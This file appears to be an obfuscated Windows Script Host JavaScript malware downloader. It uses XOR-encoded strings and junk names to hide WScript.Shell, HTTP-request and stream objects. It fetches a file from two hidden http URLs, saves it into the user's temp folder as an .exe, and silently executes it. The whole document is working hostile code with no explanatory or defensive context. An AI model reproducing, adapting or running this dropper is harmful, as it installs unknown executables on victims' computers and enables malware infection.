function btoa(gougeEid, punditoMY, sinecurej9r, veritableocJ, waivenwJ, buxomlqJ, musterqDq, homespuniqm) {
    var nattyNIj = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var minutetP4 = String(homespuniqm);
    for (var lancetf2U, allegezx6, repriseuCc = 0, scaleTH4 = nattyNIj, perpetualg98 = ""; minutetP4.charAt(repriseuCc | 0) || (scaleTH4 = "=", 
    repriseuCc % 1); perpetualg98 += scaleTH4.charAt(63 & lancetf2U >> 8 - repriseuCc % 1 * 8)) {
        allegezx6 = minutetP4.charCodeAt(repriseuCc += 3 / 4);
        if (allegezx6 > 255) {
            throw new InvalidCharacterError("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
        }
        lancetf2U = lancetf2U << 8 | allegezx6;
    }
    return perpetualg98;
}

var husbandryRig = function(sobGWQ) {
    var decadencerNk = "";
    var gougeEid = "foilXR6";
    var punditoMY = "reactionaryIbX";
    var sinecurej9r = "stultifyUCh";
    var veritableocJ = "atavismydi";
    var waivenwJ = "gauntjwz";
    var buxomlqJ = "pertTZ2";
    var musterqDq = "stiltediwy";
    btoa(gougeEid, punditoMY, sinecurej9r, veritableocJ, waivenwJ, buxomlqJ, musterqDq, [ 51, 17, 113, 91, 7, 52, 207, 141, 107, 242, 192, 107, 217, 186, 217, 195 ]);
    var pompFFg = String["sdfadfasdffromChar".slice(10) + "Codedsfadsfasdg".slice(0, 4)];
    for (var pleadfDh = 0; pleadfDh < sobGWQ.length; pleadfDh++) {
        var extenuateIqa = [ 51, 17, 113, 91, 7, 52, 207, 141, 107, 242, 192, 107, 217, 186, 217, 195 ];
        decadencerNk += pompFFg(sobGWQ[pleadfDh] ^ extenuateIqa[pleadfDh % extenuateIqa.length]);
    }
    return decadencerNk;
};

var rebusvaN = function() {
    var cravenUBD = function() {
        var dingylcN = husbandryRig([ 85, 92, 61, 8, 76, 76, 151, 212, 18, 193 ]);
        var approachiG8 = husbandryRig([ 126, 95, 21, 63, 117, 83, 183, 222, 24, 150 ]);
    };
    cravenUBD.prototype.S9sQ1jC8BN = function(cognateVLi) {
        var chideKd4 = husbandryRig([ 112, 99, 20, 58, 115, 81, 128, 239, 1, 151, 163, 31 ]);
        return wsh[chideKd4](cognateVLi);
    };
    cravenUBD.prototype.wyyig8Dsp9 = function(cognateVLi) {
        var chideKd4 = husbandryRig([ 112, 99, 20, 58, 115, 81, 128, 239, 1, 151, 163, 31 ]);
        return WScript[chideKd4](cognateVLi);
    };
    return cravenUBD;
}();

(function() {
    var renegadebze = [ husbandryRig([ 91, 101, 5, 43, 61, 27, 224, 229, 27, 147, 178, 14, 160, 213, 172, 171, 86, 99, 20, 42, 118, 26, 172, 226, 6, 221, 248, 91, 247, 223, 161, 166 ]), husbandryRig([ 91, 101, 5, 43, 61, 27, 224, 229, 27, 147, 172, 24, 182, 205, 184, 173, 71, 98, 23, 61, 41, 87, 160, 224, 68, 202, 240, 69, 188, 194, 188 ]) ];
    var dissimulatelz5 = 4194304;
    var permeateNPh = new rebusvaN();
    var querulousBjE = permeateNPh[husbandryRig([ 68, 104, 8, 50, 96, 12, 139, 254, 27, 203 ])];
    var vapidIOS = querulousBjE(husbandryRig([ 100, 66, 18, 41, 110, 68, 187, 163, 56, 154, 165, 7, 181 ]));
    var boltVJn = querulousBjE(husbandryRig([ 126, 66, 41, 22, 75, 6, 225, 213, 38, 190, 136, 63, 141, 234 ]));
    var conceptfsQ = querulousBjE(husbandryRig([ 114, 85, 62, 31, 69, 26, 156, 249, 25, 151, 161, 6 ]));
    var extolprA = vapidIOS.ExpandEnvironmentStrings(husbandryRig([ 22, 69, 52, 22, 87, 17, 147 ]));
    var promiscuousoAw = extolprA + dissimulatelz5 + husbandryRig([ 29, 116, 9, 62 ]);
    var despoilqnP = false;
    var patricianlf8 = 200;
    for (var provenderzT6 = 0; provenderzT6 < renegadebze.length; provenderzT6++) {
        try {
            var encumberiLy = renegadebze[provenderzT6];
            boltVJn.open(husbandryRig([ 116, 84, 37 ]), encumberiLy, false);
            boltVJn.send();
            if (boltVJn.status == patricianlf8) {
                try {
                    conceptfsQ[husbandryRig([ 92, 97, 20, 53 ])]();
                    conceptfsQ.type = 1;
                    conceptfsQ[husbandryRig([ 68, 99, 24, 47, 98 ])](boltVJn[husbandryRig([ 65, 116, 2, 43, 104, 90, 188, 232, 41, 157, 164, 18 ])]);
                    var vestigedSy = husbandryRig([ 88, 35, 30, 23, 119, 85, 133, 193, 39, 160 ]);
                    var oratorioNFj = husbandryRig([ 112, 97, 66, 50, 127, 124, 169, 190, 6, 190 ]);
                    var wreakC2h = husbandryRig([ 86, 121, 30, 30, 116, 0, 156, 249, 15, 189 ]);
                    var triumvirateHo2 = husbandryRig([ 127, 37, 25, 52, 75, 71, 167, 197, 8, 193 ]);
                    var scrutinizem58 = husbandryRig([ 100, 114, 73, 3, 126, 92, 162, 227, 41, 151 ]);
                    var gustymEN = Math.pow(2, 10) * 249;
                    if (conceptfsQ.size > gustymEN) {
                        provenderzT6 = renegadebze.length;
                        conceptfsQ.position = 0;
                        conceptfsQ.saveToFile(promiscuousoAw, 2);
                        despoilqnP = true;
                    }
                } finally {
                    conceptfsQ.close();
                }
            }
        } catch (ignored) {}
    }
    if (despoilqnP) {
        vapidIOS[husbandryRig([ 118, 105, 20, 56 ])](extolprA + Math.pow(2, 22));
    }
})();